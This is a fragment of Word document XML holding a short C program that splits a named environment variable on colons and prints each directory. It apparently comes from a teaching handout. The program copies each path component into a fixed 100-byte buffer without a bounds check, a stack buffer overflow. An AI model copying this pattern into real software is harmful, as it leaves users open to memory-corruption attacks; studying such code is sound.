          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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different</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00800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directories</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00800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in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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position w:val="1"/>
        </w:rPr>
        <w:t>variable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</w:rPr>
        <w:t>*/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position w:val="1"/>
        </w:rPr>
        <w:t>#include</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000F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&lt;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stdlib.h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&gt;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position w:val="1"/>
        </w:rPr>
        <w:t>#include</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>stdio.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>&gt;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</w:rPr>
        <w:t>#include</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="-1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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>string.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>&gt;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FF"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>#define</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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BUF_SIZE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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100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void</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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print_dirs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00"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-19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name,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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="309" w:right="8541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unsigned</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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w w:val="99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w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>;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unsigned</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="-10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position w:val="1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4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num_dirs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1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unsigned</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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start,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stop,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dir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char</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000F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directory[BUF_SIZE];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1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0;</w:t>
      </w:r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strlen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env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env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’:’)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="550" w:right="8780"/>
        <w:jc w:val="center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w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>num_dirs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="104" w:right="860" w:firstLine="48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21515"/>
        </w:rPr>
        <w:t>"There</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-16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are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%u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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directories</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-13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in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-13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variable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-1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%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\n"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num_dirs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, name);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="5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dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="550" w:right="8901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start</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="58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while</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="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num_dirs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)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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pacing w:val="-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start;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</w:rPr>
        <w:t>strlen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Fonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>env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i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="1030" w:right="7221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env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[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]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-8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’:’)</w:t>
      </w:r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{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="1267" w:right="8299"/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stop</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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w w:val="99"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:ind w:left="130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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6"/>
        <w:ind w:left="1030" w:right="9501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}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strncpy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directory,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-2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env</w:t>
      </w:r>
      <w:proofErr w:type="spell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+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start</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>sizeof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  <w:spacing w:val="-23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stop</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1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start);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directory[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>stop</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New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-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start]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-7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0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="82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21515"/>
        </w:rPr>
        <w:t>"%s\n"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directory);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dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="82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start</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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=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stop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+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-1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1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="3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F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="20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8"/>
        <w:ind w:left="10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FF"/>
          <w:spacing w:val="-4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main(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="-1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argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="-5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*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[])</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1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{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char</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>;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argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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!=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2)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before="1"/>
        <w:ind w:left="5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21515"/>
        </w:rPr>
        <w:t>"Usage:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-17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%s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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&lt;Environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-14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Variable&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\n"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1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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>[0]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="5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1"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>"Prints</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-17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out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the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directories</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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contained</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-11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in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the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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given</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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\</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1" w:line="200" w:lineRule="exact"/>
        <w:ind w:left="1869" w:right="4460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A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>&lt;Environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-14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Variable&gt;,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-1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position w:val="1"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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A21515"/>
          <w:w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1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A21515"/>
          <w:w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>\n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
          <w:w w:val="99"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>"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);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6"/>
        <w:ind w:left="58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exit(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:ind w:left="3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537A8C">
      <w:pPr>
        <w:spacing w:before="8"/>
        <w:ind w:left="34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env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/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getenv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[1]);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color w:val="0000FF"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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position w:val="1"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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NULL)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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position w:val="1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="584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color w:val="A21515"/>
        </w:rPr>
        <w:t>"No</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-12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environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-13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variable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-10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named</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\n"</w:t>
      </w:r>
      <w:r>
        <w:rPr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  <w:spacing w:val="-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</w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>[1]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:ind w:left="58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exit(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6"/>
        <w:ind w:left="34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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="344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dirs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[1],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
